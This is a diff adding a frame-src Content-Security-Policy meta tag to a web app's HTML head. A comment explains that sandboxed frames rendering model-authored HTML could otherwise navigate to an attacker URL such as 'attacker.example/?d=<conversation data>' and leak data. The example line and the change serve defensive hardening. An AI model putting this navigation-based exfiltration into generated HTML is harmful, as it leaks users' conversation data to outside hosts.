@@ -10,6 +10,39 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
   <meta name="theme-color" content="#1A2230" media="(prefers-color-scheme: dark)" />
   <meta name="theme-color" content="#EAEDF2" media="(prefers-color-scheme: light)" />
+
+  <!--
+    frame-src, and only frame-src (ATL-1197). Surfaces that render
+    model-authored HTML (dynamic pages, the app viewer, app-card previews) do
+    so in a srcdoc frame sandboxed without `allow-same-origin`. What no CSP
+    inside such a frame can express is the frame navigating its own browsing
+    context: `default-src` governs subresources, and `navigate-to` was never
+    shipped. A document is therefore free to send itself to
+    `https://attacker.example/?d=<conversation data>`, which is egress out of
+    a document that is supposed to have none.
+
+    The embedding page is the only place that navigation can be refused, and
+    `frame-src` is enforced on every navigation of a nested browsing context,
+    not just its first load. srcdoc frames resolve as 'self', so the surfaces
+    keep working. The web SPA shipped no CSP at all, and iOS loads this same
+    deployed bundle, so both were open; the Electron shell already carries an
+    equivalent header policy (apps/macos/src/main/csp.ts) and this meta must
+    stay in step with its frame-src list.
+
+    The ventureverse entries mirror the Electron policy: the parent-org app
+    store is the one allowed external frame if the web inline embed ships
+    (today's VV embed uses a native top-level view, not an iframe).
+
+    This is deliberately a single directive rather than a whole policy. A full
+    CSP for the SPA is worth having, but it is a much larger change with real
+    breakage surface (Google Fonts, Sentry, gateway websockets) and belongs in
+    its own rollout behind report-only. Widening this list is the only reason
+    to touch it: any other directive added here starts blocking things this
+    comment makes no claim about.
+  -->
+  <meta http-equiv="Content-Security-Policy"
+        content="frame-src 'self' https://www.ventureverse.com https://*.ventureverse.com" />
+
   <link rel="icon" href="/favicon.svg" />
   <link rel="apple-touch-icon" href="/favicon.svg" />
   <!-- Cue brand type: DM Sans (UI) + DM Mono (eyebrows/timestamps/pills). The
